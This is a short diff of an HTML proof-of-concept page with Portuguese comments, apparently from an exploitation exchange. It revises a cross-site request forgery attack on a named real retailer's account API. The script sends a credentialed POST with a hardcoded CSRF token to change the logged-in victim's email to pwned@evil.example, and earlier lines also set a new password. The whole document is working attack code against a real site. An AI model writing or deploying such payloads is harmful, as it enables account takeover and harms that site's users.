@@ -1,16 +1,19 @@
 <body>
 <script>
-/* ainda dentro do domínio Expert graças ao redirect, cookie enviado automaticamente */
-fetch('/api/neo/frontend/_api/user/changeBasicUserData',{
+fetch('https://www.expert.de/api/neo/frontend/_api/user/update',{
   method:'POST',
   credentials:'include',
-  headers:{'Content-Type':'application/json'},
+  headers:{
+    'Content-Type':'application/json',
+    'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'  // mesma chave fixa que vimos
+  },
   body:JSON.stringify({
     userData:{
-      email:'pwned@evil.example',     // e-mail de login
-      password:'SenhaNova123'         // opcional, se houver endpoint separado
+      email:'pwned@evil.example'
     }
   })
-}).then(()=>location='https://www.expert.de/')); // devolve o usuário à home
+}).then(r=>r.text())
+ .then(t=>alert('status:'+t))             // só pra você ver a resposta
+ .finally(()=>location='https://www.expert.de');
 </script>
 </body>
